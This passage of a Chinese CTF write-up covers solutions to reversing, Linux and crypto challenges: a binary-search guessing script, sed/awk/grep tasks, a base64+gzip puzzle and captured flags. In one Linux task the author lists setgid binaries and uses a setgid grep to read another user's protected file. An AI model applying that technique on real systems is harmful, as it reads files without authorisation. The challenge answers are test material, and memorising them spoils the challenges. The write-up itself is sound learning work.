&#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7; ++i )</span><br><span class="line">        *((_BYTE *)lpMem + i) ^= <span class="number">0x16u</span>;</span><br><span class="line">      v5 = sub_407A00(aFuxnfbQxrXeFLq);</span><br><span class="line">      <span class="keyword">if</span> ( v7 != v5 || sub_4021DB(lpMem, aFuxnfbQxrXeFLq, v7) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_401440(aFail);</span><br><span class="line">        sub_401440(a99s);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        sub_401440(aSuccess);</span><br><span class="line">      &#125;</span><br><span class="line">      sub_407990(lpMem);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = sub_4059A8(<span class="number">2</span>);</span><br><span class="line">      sub_401400(v4, aMemoryError);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = sub_4059A8(<span class="number">2</span>);</span><br><span class="line">    sub_401400(v1, aReadError);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><strong>Linux</strong></h2><ul>
<li>GuessWhat</li>
</ul>
<blockquote>
<p>来和猜猜超～大～的数字吧</p>
</blockquote>
<p>打开容器，巨大无比的数字，问ai发现是2^1024-1</p>
<p>二分法吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;101.37.152.107&quot;</span></span><br><span class="line">port = <span class="number">51899</span></span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((host, port))</span><br><span class="line">s.settimeout(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;欢迎信息:&quot;</span>, s.recv(<span class="number">4096</span>).decode().strip())</span><br><span class="line"></span><br><span class="line">low=<span class="number">1</span></span><br><span class="line">high=<span class="number">179769313486231590772930519078902473361797697894230657273430081157732675805500963132708477322407536021120113879871393357658789768814416622492847430639474124377767893424865485276302219601246094119453082952085005768838150682342462881473913110540827237163350510684586298239947245938479716304835356329624224137215</span></span><br><span class="line"></span><br><span class="line">prompt_bytes = <span class="string">&quot;输入一个数字:&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n尝试 <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;mid&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送猜测</span></span><br><span class="line">    guess_str = <span class="built_in">str</span>(mid) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    s.send(guess_str.encode())</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 尝试读取，允许重试</span></span><br><span class="line">    max_retries = <span class="number">3</span></span><br><span class="line">    resp_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> retry <span class="keyword">in</span> <span class="built_in">range</span>(max_retries):</span><br><span class="line">        resp = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            chunk = s.recv(<span class="number">4096</span>)</span><br><span class="line">            time.sleep(<span class="number">0.2</span>)  <span class="comment"># 等待更长时间</span></span><br><span class="line">            <span class="keyword">while</span> chunk:</span><br><span class="line">                resp += chunk</span><br><span class="line">                <span class="keyword">if</span> prompt_bytes <span class="keyword">in</span> resp:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    chunk = s.recv(<span class="number">4096</span>)</span><br><span class="line">                <span class="keyword">except</span> socket.timeout:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> socket.timeout:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  读取超时 (重试 <span class="subst">&#123;retry+<span class="number">1</span>&#125;</span>/<span class="subst">&#123;max_retries&#125;</span>)&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        resp_text = resp.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  原始响应: <span class="subst">&#123;<span class="built_in">repr</span>(resp_text)&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 如果响应包含大小提示，就跳出重试循环</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;猜得太&quot;</span> <span class="keyword">in</span> resp_text <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> resp_text.lower() <span class="keyword">or</span> <span class="string">&quot;正确&quot;</span> <span class="keyword">in</span> resp_text <span class="keyword">or</span> <span class="string">&quot;恭喜&quot;</span> <span class="keyword">in</span> resp_text:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> retry &lt; max_retries - <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># 没收到有效响应，重新发送相同的猜测</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  未收到大小提示，重新发送...&quot;</span>)</span><br><span class="line">            s.send(guess_str.encode())</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 处理响应</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;猜得太小了&quot;</span> <span class="keyword">in</span> resp_text:</span><br><span class="line">        low = mid + <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&gt; 太小&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;猜得太大了&quot;</span> <span class="keyword">in</span> resp_text:</span><br><span class="line">        high = mid - <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&gt; 太大&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> resp_text.lower() <span class="keyword">or</span> <span class="string">&quot;正确&quot;</span> <span class="keyword">in</span> resp_text <span class="keyword">or</span> <span class="string">&quot;恭喜&quot;</span> <span class="keyword">in</span> resp_text <span class="keyword">or</span> <span class="string">&quot;成功&quot;</span> <span class="keyword">in</span> resp_text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;成功！答案可能是:&quot;</span>, mid)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;完整响应:&quot;</span>, resp_text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;格式有误&quot;</span> <span class="keyword">in</span> resp_text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;格式错误，停止&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;输入一个数字:&quot;</span> <span class="keyword">in</span> resp_text <span class="keyword">and</span> (<span class="string">&quot;猜得太&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp_text):</span><br><span class="line">        <span class="comment"># 只有提示，没有大小判断</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;没有大小判断，可能游戏结束或连接异常&quot;</span>)</span><br><span class="line">        <span class="comment"># 尝试继续，但可能无效</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未知响应，继续尝试...&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n最终范围:&quot;</span>, low, <span class="string">&quot;到&quot;</span>, high)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">尝试 1022: 97840730776542341231693997877036791705381503372002052240864442189704334444583757102752029803417588499983466888360411211033468663597999986423581319971031300244738035685925678531286296576852108117779042109204420792505995413370369016448014261587879061078527642363379087098954032685672485058950496553457395585806</span><br><span class="line">  原始响应: &#x27;猜对啦！\nflag=CBCTF&#123;PwntOOOo0l5-I5_SUcH-a_PoWERFUl_to0l&#125;\n\n&#x27;</span><br><span class="line">成功！答案可能是: 97840730776542341231693997877036791705381503372002052240864442189704334444583757102752029803417588499983466888360411211033468663597999986423581319971031300244738035685925678531286296576852108117779042109204420792505995413370369016448014261587879061078527642363379087098954032685672485058950496553457395585806</span><br><span class="line">完整响应: 猜对啦！</span><br><span class="line">flag=CBCTF&#123;PwntOOOo0l5-I5_SUcH-a_PoWERFUl_to0l&#125;</span><br><span class="line"></span><br><span class="line">最终范围: 97840730776542341231693997877036791705381503372002052240864442189704334444583757102752029803417588499983466888360411211033468663597999986423581319971031300244738035685925678531286296576852108117779042109204420792505995413370369016448014261587879061078527642363379087098954032685672485058950496553457395585805 到 97840730776542341231693997877036791705381503372002052240864442189704334444583757102752029803417588499983466888360411211033468663597999986423581319971031300244738035685925678531286296576852108117779042109204420792505995413370369016448014261587879061078527642363379087098954032685672485058950496553457395585807</span><br></pre></td></tr></table></figure>
<p><strong>CBCTF{PwntOOOo0l5-I5_SUcH-a_PoWERFUl_to0l}</strong></p>
<ul>
<li>I use Debian btw</li>
</ul>
<blockquote>
<p>恭喜你拿到了一台debian机器的shell！请你做一些信息收集，然后完善一下基础设施吧～</p>
<p>使用telnet连接端口哦</p>
</blockquote>
<p>连接一下，ai提示说一般有checkme程序</p>
<p>拿到一台机器，首先要检查一下系统信息，这台机器的发行版完整名字是(PRETTY_NAME)？</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf@pod-2a9e39db8abecac116e2:~$ <span class="built_in">cat</span> /etc/os-release | grep PRETTY_NAME</span><br><span class="line">PRETTY_NAME=<span class="string">&quot;Debian GNU/Linux 13 (trixie)&quot;</span></span><br></pre></td></tr></table></figure>
<p>ctf用户的权限是多少(UID)？</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf@pod-2a9e39db8abecac116e2:~$ <span class="built_in">id</span> ctf</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) <span class="built_in">groups</span>=1000(ctf)</span><br></pre></td></tr></table></figure>
<p>接下来我来看看有没有下列工具 [x] 未找到 ps [x] 未找到 file [x] 未找到 libelf [!] 有 3 个文件未找到，请先通过apt安装他们</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install -y procps</span><br><span class="line"><span class="built_in">sudo</span> apt install -y file</span><br><span class="line"><span class="built_in">sudo</span> apt install -y elfutils libelf-dev</span><br></pre></td></tr></table></figure>
<p>用户Jackson的家目录下有一个signature文件，请你读取其中的内容告诉我</p>
<p>直接读取权限不够，需要用一些手段</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctf@pod-2a9e39db8abecac116e2:~$ find / -<span class="built_in">type</span> f -perm -2000 2&gt;/dev/null</span><br><span class="line">/usr/sbin/unix_chkpwd</span><br><span class="line">/usr/bin/grep</span><br><span class="line">/usr/bin/chage</span><br><span class="line">/usr/bin/expiry</span><br></pre></td></tr></table></figure>
<p>尝试发现</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ctf@pod-2a9e39db8abecac116e2:~$ <span class="built_in">ls</span> -la /usr/bin/grep</span><br><span class="line">-rwxr-sr-x 1 root Jackson 203152 Jan  4  2024 /usr/bin/grep</span><br><span class="line">ctf@pod-2a9e39db8abecac116e2:~$ <span class="built_in">ls</span> -la /usr/bin/grep | awk <span class="string">&#x27;&#123;print $4&#125;&#x27;</span></span><br><span class="line">Jackson</span><br></pre></td></tr></table></figure>
<p><code>/usr/bin/grep</code> 是setgid到Jackson组的！这意味着当我们运行grep时，它会以Jackson组的权限运行，而Jackson组有读取signature文件的权限。</p>
<p>于是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf@pod-2a9e39db8abecac116e2:~$ /usr/bin/grep . /home/Jackson/signature</span><br><span class="line">db9ef65a-7e7b-4db2-af77-739ae0407f53</span><br></pre></td></tr></table></figure>
<p>你知道git吗？lazygit是一个TUI前端，可以方便git操作，请你帮我取来0.54.2版本，并告诉我文件的路径</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用apt安装必要的工具</span></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y wget</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果wget安装失败，尝试curl</span></span><br><span class="line">sudo apt install -y curl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载lazygit 0.54.2</span></span><br><span class="line">wget https://github.com/jesseduffield/lazygit/releases/download/v0<span class="number">.54</span><span class="number">.2</span>/lazygit_0<span class="number">.54</span><span class="number">.2</span>_Linux_x86_64.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar -xzf lazygit_0<span class="number">.54</span><span class="number">.2</span>_Linux_x86_64.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件路径</span></span><br><span class="line">pwd</span><br><span class="line">ls -la</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ctf@pod-2a9e39db8abecac116e2:~$ <span class="built_in">ls</span> -la</span><br><span class="line">total 29192</span><br><span class="line">drwx------ 1 ctf  ctf      4096 Dec 19 02:11 .</span><br><span class="line">drwxr-xr-x 1 root root     4096 Aug 26 18:13 ..</span><br><span class="line">-rw-r--r-- 1 ctf  ctf        67 Aug 25 08:23 .bash_history</span><br><span class="line">-rw-r--r-- 1 ctf  ctf       220 Jul 30 19:28 .bash_logout</span><br><span class="line">-rw-r--r-- 1 ctf  ctf      3606 Dec 19 01:59 .bashrc</span><br><span class="line">-rw-r--r-- 1 ctf  ctf       807 Jul 30 19:28 .profile</span><br><span class="line">-rw-rw-r-- 1 ctf  ctf       165 Dec 19 02:11 .wget-hsts</span><br><span class="line">-rw-r--r-- 1 ctf  ctf      1071 Aug 11 16:22 LICENSE</span><br><span class="line">-rw-r--r-- 1 ctf  ctf     31910 Aug 11 16:22 README.md</span><br><span class="line">-rw-r--r-- 1 root root       64 Aug 25 08:23 hint</span><br><span class="line">-rwxr-xr-x 1 ctf  ctf  21901496 Aug 11 16:27 lazygit</span><br><span class="line">-rw-rw-r-- 1 ctf  ctf   7906869 Aug 11 16:28 lazygit_0.54.2_Linux_x86_64.tar.gz</span><br></pre></td></tr></table></figure>
<p>最后从lazygit中提取出编译的build id信息吧（GNU的）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install -y binutils</span><br><span class="line">/home/ctf/lazygit | grep -i build</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">拿到一台机器，首先要检查一下系统信息，这台机器的发行版完整名字是(PRETTY_NAME)？</span><br><span class="line">Debian GNU/Linux 13 (trixie)</span><br><span class="line">[-] 通过</span><br><span class="line">ctf用户的权限是多少(UID)？</span><br><span class="line">1000</span><br><span class="line">[-] 通过</span><br><span class="line">接下来我来看看有没有下列工具</span><br><span class="line">[+] 已找到 ps</span><br><span class="line">[+] 已找到 file</span><br><span class="line">[+] 已找到 libelf</span><br><span class="line">[-] 已找到所有文件</span><br><span class="line">用户Jackson的家目录下有一个signature文件，请你读取其中的内容告诉我</span><br><span class="line">db9ef65a-7e7b-4db2-af77-739ae0407f53</span><br><span class="line">[-] 通过</span><br><span class="line">你知道git吗？lazygit是一个TUI前端，可以方便git操作，请你帮我取来0.54.2版本，并告诉我文件的路径</span><br><span class="line">/home/ctf/lazygit</span><br><span class="line">[-] 通过</span><br><span class="line">最后从lazygit中提取出编译的build <span class="built_in">id</span>信息吧（GNU的）</span><br><span class="line">c2d913ebc9b342bfa601bb4296492a46706d0769</span><br><span class="line">[-] 通过</span><br><span class="line">恭喜你成功通过了所有测试！flag是：CBCTF&#123;wOw-U-r_LIiiNUx-M@ST3R&#125;</span><br></pre></td></tr></table></figure>
<p><strong>CBCTF{wOw-U-r_LIiiNUx-M@ST3R}</strong></p>
<ul>
<li>三剑客</li>
</ul>
<blockquote>
<p>Linux有三剑客，你知道怎么使用吗？</p>
<p>使用telnet连接端口哦</p>
</blockquote>
<p>第一关：TASK 1 请输入一条命令，将标准输入中的所有x字符删除，并在第10行后插入一行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -e <span class="string">&#x27;s/x//g&#x27;</span> -e <span class="string">&#x27;10a checkme&#x27;</span></span><br></pre></td></tr></table></figure>
<p>第二关：TASK 2 请输入一条命令，给标准输入中的每一行加一个行号，类似1 …</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;&#123;print NR, $0&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>第三关：TASK 3 请输入一条命令，从标准输入中取出所有形如13190011239这样的电话号码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -oE <span class="string">&quot;1[0-9]&#123;10&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>CBCTF{25a972b3-8493-498c-ae21-ceac3e70e77b}</strong></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h2><ul>
<li>Wilderness</li>
</ul>
<blockquote>
<p>Had I not seen the… I’d almost swear this text was Base64. But something feels off—it’s as if it’s been… compressed somehow ?</p>
<p>若不是看到了·-··-· 我差点就以为这段文本是 Base64 编码。但总觉得哪里不对劲 —— 仿佛它被·-··-·压缩过？</p>
</blockquote>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure>
<p>base64+Gunzip</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">It looks like this is a really long number, almost lost in the wilderness of data. Let&#x27;s shine a light on it and see if we can find any clues! 01010100 01101000 01100101 00100000 01110100 01101001 01101101 01100101 00100000 01101000 01100001 01110011 00100000 01100011 01101111 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100001 01101011 01100101 00100000 01100001 00100000 01100011 01101000 01101111 01101001 01100011 01100101 00101110 00100000 01000011 01101000 01101111 01101111 01110011 01100101 00100000 01110111 01101001 01110011 01100101 01101100 01111001 00101100 00100000 01101111 01110010 00100000 01111001 01101111 01110101 00100000 01110010 01101001 01110011 01101011 00100000 01101100 01100101 01110100 01110100 01101001 01101110 01100111 00100000 01111001 01101111 01110101 01110010 00100000 01101000 01100101 01100001 01110010 01110100 00100000 01100010 01100101 01100011 01101111 01101101 01100101 00100000 01100001 00100000 01101110 01100101 01110111 01100101 01110010 00100000 01110111 01101001 01101100 01100100 01100101 01110010 01101110 01100101 01110011 01110011 00101100 00100000 01100001 01101110 01100100 00100000 01110100 01101000 01100101 00100000 01110100 01110010 01110101 01100101 00100000 01100110 01101100 01100001 01100111 00100000 01101101 01100001 01111001 00100000 01110010 01100101 01101101 01100001 01101001 01101110 00100000 01101000 01101001 01100100 01100100 